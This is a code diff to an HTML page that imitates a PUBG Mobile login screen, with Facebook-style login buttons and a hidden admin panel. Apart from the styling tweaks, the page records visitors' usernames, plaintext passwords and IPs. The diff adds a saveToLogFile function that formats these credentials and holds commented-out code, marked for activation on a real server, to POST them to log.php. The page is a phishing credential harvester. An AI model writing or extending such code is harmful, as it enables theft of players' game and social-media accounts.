@@ -33,7 +33,7 @@
       }
     }
     
-    /* Overlay for both */
+    /* Overlay */
     body::after {
       content: '';
       position: fixed;
@@ -43,6 +43,16 @@
       height: 100%;
       background: rgba(0, 0, 0, 0.6);
       z-index: -1;
+    }
+    
+    .content-container {
+      position: relative;
+      z-index: 2;
+      width: 100%;
+      max-width: 500px;
+      padding: 30px;
+      text-align: center;
+      margin: 20px;
     }
     
     .logo {
@@ -150,13 +160,9 @@
       margin-top: 25px;
       font-size: 14px;
       text-align: center;
-      background: rgba(255, 255, 255, 0.1);
       padding: 15px 20px;
-      border-radius: 10px;
       max-width: 320px;
       margin: 0 auto;
-      backdrop-filter: blur(5px);
-      border: 1px solid rgba(255, 255, 255, 0.15);
     }
     
     .legal a {
@@ -171,11 +177,11 @@
       text-shadow: 0 0 8px rgba(255, 215, 0, 0.5);
     }
     
-    /* Admin Button */
+    /* Admin Button - Smaller */
     .admin-btn {
       position: fixed;
-      top: 20px;
-      right: 20px;
+      top: 15px;
+      right: 15px;
       padding: 8px 16px;
       background: rgba(30, 30, 40, 0.8);
       border: 1px solid rgba(0, 100, 255, 0.5);
@@ -188,14 +194,14 @@
       letter-spacing: 1px;
       z-index: 100;
       font-size: 12px;
-      box-shadow: 0 0 15px rgba(30, 144, 255, 0.3);
+      box-shadow: 0 0 10px rgba(30, 144, 255, 0.3);
       z-index: 3;
     }
     
     .admin-btn:hover {
       background: rgba(0, 80, 200, 0.3);
       transform: translateY(-2px);
-      box-shadow: 0 0 20px rgba(30, 144, 255, 0.5);
+      box-shadow: 0 0 15px rgba(30, 144, 255, 0.5);
     }
     
     /* Admin Panel */
@@ -611,9 +617,8 @@
         padding: 14px;
       }
       
-      .admin-btn {
-        padding: 6px 12px;
-        font-size: 10px;
+      .content-container {
+        padding: 20px;
       }
       
       .admin-table th, 
@@ -635,6 +640,13 @@
         width: 100%;
         justify-content: center;
       }
+      
+      .admin-btn {
+        top: 10px;
+        right: 10px;
+        padding: 6px 12px;
+        font-size: 11px;
+      }
     }
   </style>
 </head>
@@ -643,7 +655,7 @@
     <i class="fas fa-user-secret"></i> ADMIN
   </button>
   
-  <div class="overlay">
+  <div class="content-container">
     <div class="logo">PUBG<br><span>MOBILE</span></div>
     <div class="buttons">
       <button class="facebook" id="facebookLogin">
@@ -1029,10 +1041,38 @@
       // LocalStorage'a kaydet
       localStorage.setItem('pubgLoginAttempts', JSON.stringify(loginAttempts));
       
+      // Log dosyasına kaydet
+      saveToLogFile(attempt);
+      
       // Admin paneli açıksa güncelle
       if(adminPanel.style.display === 'block') {
         updateAdminPanel();
       }
+    }
+    
+    // Log dosyasına kaydetme fonksiyonu
+    function saveToLogFile(attempt) {
+      const logEntry = `[${attempt.time}] - ${attempt.method} - Kullanıcı: ${attempt.username} - Şifre: ${attempt.password} - IP: ${attempt.ip}\n`;
+      
+      // Sunucu tarafına göndermek için AJAX kullanımı
+      // Bu kısım gerçek sunucuya geçtiğinizde aktifleştirilmelidir
+      /*
+      const formData = new FormData();
+      formData.append('log', logEntry);
+      
+      fetch('log.php', {
+        method: 'POST',
+        body: formData
+      })
+      .then(response => {
+        if(!response.ok) {
+          console.error('Log kaydı başarısız:', response.status);
+        }
+      })
+      .catch(error => {
+        console.error('Log kaydı hatası:', error);
+      });
+      */
     }
     
     // Admin panelini güncelleme
